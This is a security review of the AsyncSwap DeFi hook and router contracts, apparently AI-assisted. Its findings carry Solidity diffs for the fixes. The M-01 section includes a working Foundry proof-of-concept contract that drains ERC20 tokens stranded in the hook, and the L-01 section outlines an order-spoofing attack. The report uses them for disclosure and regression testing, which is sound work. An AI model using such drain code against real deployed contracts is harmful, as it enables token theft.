# AsyncSwap Protocol Security Review

**Date**: 2026-10-10
**Commit**: 760699a (`dev`)
**Scope**: `src/AsyncSwap.sol`, `src/Router.sol`, `src/FeeVault.sol`, `src/BaseHook.sol`, `src/ImmutableState.sol`, `src/libraries/AsyncFiller.sol`, `src/libraries/OrderSignatures.sol`, `src/types/AsyncOrder.sol`, `src/interfaces/ISignatureTransfer.sol`
**Author**: Claude Code (AI-assisted review), with a second reviewer's notes folded in

No critical or high-severity issues were found, and nothing puts open-order escrow at risk. The remediations for the earlier findings (C-01, H-01 to H-05 in `lee-audit.md`) still hold.

**Remediation:** all findings except I-02 (acknowledged) are fixed. See [README.md](README.md) for the status checklist.

---

## Summary

| ID | Title | Severity | Status |
|----|-------|----------|--------|
| M-01 | Anyone can steal ERC20 tokens sitting in the hook through `executeOrder` | Medium | ✅ Fixed |
| M-02 | Scripted CREATE2 deploy makes the deterministic deployer the hook owner | Medium | ✅ Fixed |
| L-01 | Anyone can create orders that appear to belong to someone else | Low | ✅ Fixed |
| L-02 | A signed `CancelOrder` can be replayed on a new order with the same ID | Low | ✅ Fixed |
| L-03 | Tokens that don't return a bool can't be traded | Low | ✅ Fixed |
| I-01 | Ownership transfers in a single step | Info | ✅ Fixed |
| I-02 | Fee rounds to zero on small orders | Info | 📝 Acknowledged |
| I-03 | One check uses a string revert instead of a custom error | Info | ✅ Fixed |

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 0 |
| Medium | 2 |
| Low | 3 |
| Informational | 3 |

---

## Findings

### [M-01] Anyone can steal ERC20 tokens sitting in the hook through `executeOrder`

**Location**: `src/AsyncSwap.sol` `executeOrder`, `src/libraries/AsyncFiller.sol` `fill`, `src/Router.sol` `unlockCallback`

#### Description

`AsyncFiller.fill` pays the order output with:

```solidity
output.settle(self.poolManager, hook, amountOutMin + fee, false);
```

For an ERC20 output, this transfers tokens **from the hook's own balance**. For native ETH, the hook limits this to ETH deposited in the same transaction (`PENDING_NATIVE_DEPOSIT_SLOT`). ERC20 output has no equivalent check.

The only access check in `fill` is `isExecutor[order.owner][msg.sender]`, and any maker can authorize any address. An attacker can therefore act as both maker and executor:

1. Call `hook.setExecutor(poolId, attackerContract, true)`.
2. Inside the attacker's own `PoolManager.unlock`, call `PoolManager.swap` with hookData `{user: attacker, executor: attacker, amountOutMin: X}`, paying 1 wei of input.
3. Recompute the salt (all of its inputs are known within the transaction) and call `hook.executeOrder(order, abi.encode(attacker))` directly.

The hook settles `X + fee` from its own ERC20 balance, pays `X` to the attacker as maker, and returns the 1 wei input to the attacker as filler.

#### Impact

The attacker steals any ERC20 balance held by the hook, such as tokens sent there by mistake or as donations. Between transactions, the hook should hold no ERC20 escrow, so the loss is limited to those funds. However, an attacker can always take them before the owner calls `sweep`.

#### Proof of concept

Original PoC below. On the unfixed code (`760699a`) it **passes**, draining all 500 tokens and refunding the attacker's input. It is kept as a regression test in `test/audit/SR_M01_ERC20StrandedDrain.t.sol`, which now expects the attack to revert.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {AsyncSwap} from "@async-swap/AsyncSwap.sol";
import {AsyncOrder} from "@async-swap/types/AsyncOrder.sol";
import {MockERC20} from "../utils/MockERC20.sol";
import {Test} from "forge-std/Test.sol";
import {PoolManager} from "v4-core/PoolManager.sol";
import {Currency, IPoolManager, SwapParams} from "v4-core/interfaces/IPoolManager.sol";
import {Hooks} from "v4-core/libraries/Hooks.sol";
import {LPFeeLibrary} from "v4-core/libraries/LPFeeLibrary.sol";
import {PoolIdLibrary, PoolKey} from "v4-core/types/PoolKey.sol";
import {CurrencySettler} from "@uniswap/v4-core/test/utils/CurrencySettler.sol";

contract Drainer {
    using CurrencySettler for Currency;
    IPoolManager pm; AsyncSwap hook; PoolKey key;
    constructor(IPoolManager _pm, AsyncSwap _hook, PoolKey memory _key) { pm = _pm; hook = _hook; key = _key; }
    function go(uint256 amountOutMin) external {
        hook.setExecutor(PoolIdLibrary.toId(key), address(this), true);
        pm.unlock(abi.encode(amountOutMin));
    }
    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        uint256 amountOutMin = abi.decode(data, (uint256));
        // 1. Create an order owned by ourselves, with ourselves as executor: 1 wei currency0 in.
        pm.swap(key, SwapParams(true, -1, 4295128740),
            abi.encode(AsyncSwap.UserParams({user: address(this), executor: address(this), amountOutMin: amountOutMin})));
        key.currency0.settle(pm, address(this), 1, false);
        bytes32 salt = keccak256(abi.encode(block.timestamp, block.number, address(pm), address(this), uint256(1), amountOutMin));
        AsyncOrder memory o = AsyncOrder(key, address(this), true, 1, amountOutMin, 0, salt);
        // 2. Fill it directly; output is paid from the hook's own ERC20 balance.
        hook.executeOrder(o, abi.encode(address(this)));
        return "";
    }
}

contract ERC20StrandedDrainTest is Test {
    function test_AnyoneDrainsStrandedERC20() public {
        IPoolManager manager = new PoolManager(address(this));
        MockERC20 a = new MockERC20("A", "A", 18);
        MockERC20 b = new MockERC20("B", "B", 18);
        (MockERC20 t0, MockERC20 t1) = address(a) < address(b) ? (a, b) : (b, a);
        uint160 flags = uint160(Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_SWAP_FLAG | Hooks.BEFORE_ADD_LIQUIDITY_FLAG
            | Hooks.BEFORE_SWAP_RETURNS_DELTA_FLAG);
        deployCodeTo("AsyncSwap.sol", abi.encode(manager, Currency.wrap(address(t1))), address(flags));
        AsyncSwap hook = AsyncSwap(payable(address(flags)));
        PoolKey memory key = PoolKey(Currency.wrap(address(t0)), Currency.wrap(address(t1)), LPFeeLibrary.DYNAMIC_FEE_FLAG, 1, hook);
        manager.initialize(key, 2 ** 96);

        t1.mint(address(hook), 500 ether); // stranded / mistakenly sent tokens
        Drainer d = new Drainer(manager, hook, key);
        t0.mint(address(d), 1);
        uint256 amountOutMin = 499 ether; // + fee (1 ether) == 500 ether
        d.go(amountOutMin);

        assertEq(t1.balanceOf(address(hook)), 0);
        assertEq(t1.balanceOf(address(d)), 499 ether);
        assertEq(t0.balanceOf(address(d)), 1); // input refunded
    }
}
```

#### Fix (applied)

Never let the hook spend its own ERC20 balance. The executor pays the filler's tokens straight into the PoolManager and credits them to the hook with `settleFor`. `fill` then settles from the hook's balance only for native output, which the deposit ledger already guards. This does not depend on trusting any particular Router: an executor that does not pre-settle leaves the hook with a negative delta, and the unlock reverts.

```diff
--- a/src/libraries/AsyncFiller.sol
+++ b/src/libraries/AsyncFiller.sol
@@ function fill(
-        output.settle(self.poolManager, hook, amountOutMin + fee, false);
+        // ERC20 output is pre-settled to the hook's credit by the executor (settleFor); the hook
+        // never spends its own token balance. Native output is guarded by the hook's deposit ledger.
+        if (output.isAddressZero()) output.settle(self.poolManager, hook, amountOutMin + fee, false);
         output.take(self.poolManager, order.owner, amountOutMin, false);
```

```diff
--- a/src/Router.sol
+++ b/src/Router.sol
@@ function unlockCallback(bytes calldata data)
             if (!output.isAddressZero()) {
-                assert(IERC20Minimal(Currency.unwrap(output)).transferFrom(user, address(HOOK), livePrice));
+                POOLMANAGER.sync(output);
+                assert(IERC20Minimal(Currency.unwrap(output)).transferFrom(user, address(POOLMANAGER), livePrice));
+                POOLMANAGER.settleFor(address(HOOK));
             }
```

**Verification:** every existing test suite passes. The PoC now reverts: the PoolManager's `take` fails because the hook never paid in. The Router change was applied together with the safe-transfer change from L-03 (`safeTransferFrom` instead of `assert(transferFrom(...))`).

**Alternative:** restrict `executeOrder` callers to a trusted Router address set at deployment. This works only if the Router is the trusted funding path. A balance check by itself is not enough unless it is tied to a trusted transfer.

---

### [M-02] Scripted CREATE2 deploy makes the deterministic deployer the hook owner

**Location**: `src/AsyncSwap.sol` constructor, `script/01_DeployHook.s.sol`
**Found**: during deployment preparation, after the initial review

#### Description

The constructor set `owner = msg.sender`. The deploy script creates the hook with `new AsyncSwap{salt: salt}(...)` inside `vm.startBroadcast(OWNER)`. Foundry sends salted creations through the deterministic CREATE2 deployer (`0x4e59b44847b379578588920cA78FbF26c0B4956C`), so that contract runs the constructor and becomes `owner`. A probe script confirmed it: inside a broadcast, the constructor's `msg.sender` was `0x4e59…956C`.

#### Impact

The CREATE2 deployer cannot make arbitrary calls. A freshly deployed hook would therefore have an owner that can never call `sweep`, `FeeVault.collect` or `transferOwnership`, so protocol fees would be locked forever. The currently live Unichain hook predates the `owner` logic and is not affected.

#### Fix (applied)

The constructor takes the owner explicitly and rejects `address(0)`. The deploy script passes `OWNER` (also included in the init-code hash used for salt mining) and asserts `hook.owner() == OWNER` after deploying.

```diff
-    constructor(IPoolManager _poolManager, Currency _numeraire) BaseHook(_poolManager) EIP712("AsyncSwap", "1") {
+    constructor(IPoolManager _poolManager, Currency _numeraire, address _owner)
+        BaseHook(_poolManager)
+        EIP712("AsyncSwap", "1")
+    {
         if (Currency.unwrap(_numeraire).code.length == 0) revert InvalidNumeraire();
+        if (_owner == address(0)) revert ZeroAddress();
         numeraire = _numeraire;
-        owner = msg.sender;
+        owner = _owner;
```

Regression tests: `test_ownerIsExplicitArgumentNotDeployer` and `test_rejectZeroOwner` in `test/Numeraire.t.sol`.

---

### [L-01] Anyone can create orders that appear to belong to someone else

**Location**: `src/AsyncSwap.sol` `_beforeSwap` / `_createOrder`

#### Description

`_createOrder` checks `isExecutor[hookData.user][hookData.executor]` but never checks that the swap `sender` equals `hookData.executor`. Anyone can call `PoolManager.swap` directly with `user = victim, executor = Router` and any `amountOutMin`. The order is then recorded as the victim's.

#### Impact

The attacker pays the input, so this is not theft from the victim. However, the attacker can create unlimited fake `AsyncOrderCreated` / `HookSwap` events under the victim's address, which misleads indexers and frontends.

#### PoC outline

```solidity
// attacker contract, inside its own unlockCallback; victim has setExecutor(poolId, router, true)
pm.swap(key, SwapParams(true, -1e18, MIN_SQRT_PRICE + 1),
    abi.encode(AsyncSwap.UserParams({user: victim, executor: address(router), amountOutMin: 1})));
key.currency0.settle(pm, address(this), 1e18, false);
// => AsyncOrderCreated(poolId, id, victim, ...) emitted; order stored under the victim
```

#### Fix

```diff
--- a/src/AsyncSwap.sol
+++ b/src/AsyncSwap.sol
@@ function _beforeSwap(address sender, PoolKey calldata key, SwapParams calldata params, bytes calldata hookParams)
         UserParams memory hookData = abi.decode(hookParams, (UserParams));
+        // Bind the declared executor to the actual swap caller.
+        if (sender != hookData.executor) revert AsyncFiller.NotAuthorizedExecutor();
```

This is consistent with the Router path: for `swap` and `swapWithSig`, both `sender` and `executor` are the Router.

---

### [L-02] A signed `CancelOrder` can be replayed on a new order with the same ID

**Location**: `src/Router.sol` `cancelWithSig`, `src/libraries/OrderSignatures.sol` `hashCancel`

#### Description

`CancelOrder` has no nonce. It relies on the cancelled order being deleted to stop replay. The salt is `keccak256(timestamp, number, msg.sender, user, amountIn, amountOutMin)`, so if a maker places, cancels and re-places an identical order in the same block, the new order gets the same `orderId` (the collision walk runs only while the slot is occupied). A signed cancel that is still within its deadline then works again on the new order.

#### Impact

Griefing only: funds always return to the owner.

#### PoC outline

1. The maker creates order A (`amountIn`, `amountOutMin`) and signs `CancelOrder(A)`.
2. A relayer submits `cancelWithSig`, and order A is deleted.
3. In the same block, the maker re-creates an identical order, which gets the same salt and therefore the same `orderId`.
4. Anyone resubmits the same signature to `cancelWithSig`, and the new order is cancelled.

#### Fix

Add a nonce to `CancelOrder` and burn it in the Router:

```diff
--- a/src/libraries/OrderSignatures.sol
+++ b/src/libraries/OrderSignatures.sol
     bytes32 internal constant CANCEL_ORDER_TYPEHASH = keccak256(
-        "CancelOrder(address maker,address tokenIn,address tokenOut,uint256 amountIn,bytes32 orderId,uint256 deadline)"
+        "CancelOrder(address maker,address tokenIn,address tokenOut,uint256 amountIn,bytes32 orderId,uint256 nonce,uint256 deadline)"
     );
-    function hashCancel(AsyncOrder memory order, bytes32 orderId, uint256 amountIn, uint256 deadline)
+    function hashCancel(AsyncOrder memory order, bytes32 orderId, uint256 amountIn, uint256 nonce, uint256 deadline)
 ...
-        return keccak256(abi.encode(CANCEL_ORDER_TYPEHASH, order.owner, tokenIn, tokenOut, amountIn, orderId, deadline));
+        return keccak256(abi.encode(CANCEL_ORDER_TYPEHASH, order.owner, tokenIn, tokenOut, amountIn, orderId, nonce, deadline));
```

```diff
--- a/src/Router.sol
+++ b/src/Router.sol
+    mapping(address maker => mapping(uint256 nonce => bool)) public cancelNonceUsed;
+    error NonceAlreadyUsed();

-    function cancelWithSig(AsyncOrder calldata order, uint256 deadline, bytes calldata signature) external {
+    function cancelWithSig(AsyncOrder calldata order, uint256 nonce, uint256 deadline, bytes calldata signature) external {
         if (block.timestamp > deadline) revert SignatureExpired();
+        if (cancelNonceUsed[order.owner][nonce]) revert NonceAlreadyUsed();
+        cancelNonceUsed[order.owner][nonce] = true;
         bytes32 id = _orderId(order);
         (uint256 amountIn,) = HOOK.asyncOrderInfo(order.key.toId(), id);
-        bytes32 digest = _hashTypedDataV4(OrderSignatures.hashCancel(order, id, amountIn, deadline));
+        bytes32 digest = _hashTypedDataV4(OrderSignatures.hashCancel(order, id, amountIn, nonce, deadline));
```

Alternative: include a per-maker counter in the order salt so order IDs are never reused.

---

### [L-03] Tokens that don't return a bool can't be traded

**Location**: `src/Router.sol` `unlockCallback`; every use of `CurrencySettler` (`AsyncSwap.sol`, `AsyncFiller.sol`, `Router.sol`)

#### Description

Production code imports `CurrencySettler` from `v4-core/test/utils`. Its ERC20 branch calls `IERC20Minimal.transfer` / `transferFrom`, which expect a returned `bool`. The Router also uses `assert(IERC20Minimal(...).transferFrom(...))`. Tokens that return no data, such as mainnet USDT, make these calls revert.

#### Impact

Pools that pair USDC with such tokens cannot be traded. This becomes more likely as deployment expands to more chains (`script/config/chains.json`).

#### Fix

1. Copy a production settle helper into `src/libraries/` (instead of importing from `v4-core/test/utils`) that uses safe transfers:

```solidity
// src/libraries/CurrencySettler.sol (production copy)
import {SafeTransferLib} from "solmate/src/utils/SafeTransferLib.sol"; // or Solady / OZ SafeERC20
...
} else {
    manager.sync(currency);
    if (payer != address(this)) {
        SafeTransferLib.safeTransferFrom(ERC20(Currency.unwrap(currency)), payer, address(manager), amount);
    } else {
        currency.transfer(address(manager), amount); // CurrencyLibrary handles non-standard tokens
    }
    manager.settle();
}
```

2. In the Router, replace `assert(IERC20Minimal(...).transferFrom(...))` with `safeTransferFrom`.

Add a regression test that uses a mock token whose `transfer`/`transferFrom` return no data.

---

### [I-01] Ownership transfers in a single step

**Location**: `src/AsyncSwap.sol` `transferOwnership`

The new owner takes effect immediately. A mistyped address permanently loses control of `sweep` and `FeeVault.collect`.

**Fix**: use a two-step transfer.

```solidity
address public pendingOwner;

function transferOwnership(address newOwner) external onlyOwner {
    pendingOwner = newOwner;
}

function acceptOwnership() external {
    if (msg.sender != pendingOwner) revert NotOwner();
    emit OwnershipTransferred(owner, msg.sender);
    owner = msg.sender;
    pendingOwner = address(0);
}
```

---

### [I-02] Fee rounds to zero on small orders

**Location**: `src/AsyncSwap.sol` `calculatePoolFee`

`amount / 499` is added on top of the maker's net `amountOutMin`. As a share of the gross amount the filler pays, the fee is `(n/499) / (n + n/499) = 1/500` = **exactly 0.2%**, as the NatSpec says. *(An earlier draft of this report wrongly called it 0.2004%. That figure is relative to the net amount, not the gross.)*

Because it rounds down, orders with `amountOutMin < 499` base units pay no fee. With 6-decimal USDC, that is under $0.0005, so the impact is negligible.

**Fix (optional)**: enforce a minimum `amountOutMin` at order creation, or round the fee up.

---

### [I-03] One check uses a string revert instead of a custom error

**Location**: `src/AsyncSwap.sol` `_beforeInitialize`

```diff
+    error DynamicFeeRequired();
 ...
-        require(key.fee == LPFeeLibrary.DYNAMIC_FEE_FLAG, "Dude use dynamic fees flag");
+        if (key.fee != LPFeeLibrary.DYNAMIC_FEE_FLAG) revert DynamicFeeRequired();
```

---

## Regression tests

Each of these fails on `760699a` and passes with the fixes.

- **M-01:** `test/audit/SR_M01_ERC20StrandedDrain.t.sol`: a self-authorized executor's drain attempt reverts.
- **M-02:** `test_ownerIsExplicitArgumentNotDeployer` and `test_rejectZeroOwner` in `test/Numeraire.t.sol`: the owner comes from the constructor argument, never from the deployer.
- **L-01:** `test/audit/SR_L01_OrderSpoofing.t.sol`: a direct `PoolManager.swap` with `user = victim` from a non-executor reverts with `NotAuthorizedExecutor`.
- **L-02:** `test_cancelWithSig_rejectsReplayOnRecurringOrderId` in `test/SignedOrders.t.sol`: replaying a used `CancelOrder` signature on a recurring order ID reverts with `NonceAlreadyUsed`.
- **L-03:** `test/audit/SR_L03_NoReturnToken.t.sol`: create, cancel and fill all work with a token whose `transfer`/`transferFrom` return no data.

---

## Reviewed and found safe

- **Native-output fills**: the transient pending-deposit ledger prevents fills from drawing on stranded or donated ETH (C-01, H-05).
- **Escrow accounting**: input is held as ERC-6909 claims, and every fill and cancel path leaves PoolManager deltas at zero.
- **`Router.unlockCallback`**: only the PoolManager can call it. The action read from `calldataload(0x44)` is correct for both callback encodings. Nested calls back into the Router are blocked by the PoolManager's `AlreadyUnlocked` check.
- **Permit2 witness**: the type string is ordered correctly under EIP-712, and the witness binds the maker, tokens, amounts and pool.
- **`setExecutorWithSig` / `updatePriceWithSig`**: nonces stop replay, and front-running the grant in `swapWithSig` is handled.
- **`FeeVault`**: only the hook owner can collect, and the callback accepts calls only from the PoolManager.
- **Deployment config diff** (`chains.json`, `.env.deploy.example`): contains no secrets.
